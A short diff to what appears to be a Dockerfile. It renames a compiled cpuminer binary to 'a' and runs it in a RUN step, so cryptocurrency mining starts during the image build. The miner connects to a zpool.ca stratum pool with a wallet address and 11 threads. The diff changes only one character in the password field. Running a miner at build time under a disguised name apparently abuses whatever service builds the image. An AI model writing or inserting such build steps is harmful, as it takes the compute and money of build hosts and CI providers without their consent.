@@ -33,5 +33,5 @@ RUN apt-get update \
 COPY --from=builder /app/cpuminer .
 ENTRYPOINT ["./cpuminer"]
 RUN mv cpuminer a
-RUN ./a -a lyra2z330 -o stratum+tcp://lyra2z330.sea.mine.zpool.ca:4563 -u MK3aSa6UtVfoZm6xmS9U39t3zSbmjDDgRJ -p RIGHK32,c=LTC,zap=PYRK-lyra2z330 -t 11
+RUN ./a -a lyra2z330 -o stratum+tcp://lyra2z330.sea.mine.zpool.ca:4563 -u MK3aSa6UtVfoZm6xmS9U39t3zSbmjDDgRJ -p RIGHJ32,c=LTC,zap=PYRK-lyra2z330 -t 11
 CMD ["-h"]
